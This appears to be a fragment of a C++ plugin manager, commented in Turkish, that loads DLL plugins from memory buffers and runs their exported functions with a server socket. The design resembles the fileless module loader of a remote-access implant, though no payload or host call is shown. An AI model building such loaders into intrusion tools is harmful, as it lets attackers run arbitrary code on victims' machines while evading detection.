#include "PluginManager.hpp"
#include "MemoryLoader.hpp" // Kritik: MemoryLoader sınıfını tanıtıyoruz
#include <iostream>

bool PluginManager::isPluginLoaded(const std::string& pluginId) {
    return loadedPlugins.find(pluginId) != loadedPlugins.end();
}

bool PluginManager::loadPluginFromMemory(const std::string& pluginId, const std::vector<unsigned char>& buffer) {
    std::cout << "[*] Plugin bellege yukleniyor: " << pluginId << std::endl;
    
    HMODULE hMod = MemoryLoader::Load(buffer);
    
    if (hMod) {
        loadedPlugins[pluginId] = hMod;
        return true;
    }
    return false;
}

void PluginManager::executePlugin(const std::string& pluginId, const std::string& funcName, SOCKET serverSock) {
    if (!isPluginLoaded(pluginId)) return;

    typedef void (*PluginEntry)(SOCKET);
    // GetProcAddress normalde diskteki DLL'ler içindir, manuel map'te 
    // export tablosunu manuel parse eden bir fonksiyon gerekebilir.
    PluginEntry func = (PluginEntry)GetProcAddress(loadedPlugins[pluginId], funcName.c_str());

    if (func) {
        std::cout << "[+] Plugin calistiriliyor..." << std::endl;
        func(serverSock);
    } else {
        std::cerr << "[-] Plugin fonksiyonu bulunamadi!" << std::endl;
    }
}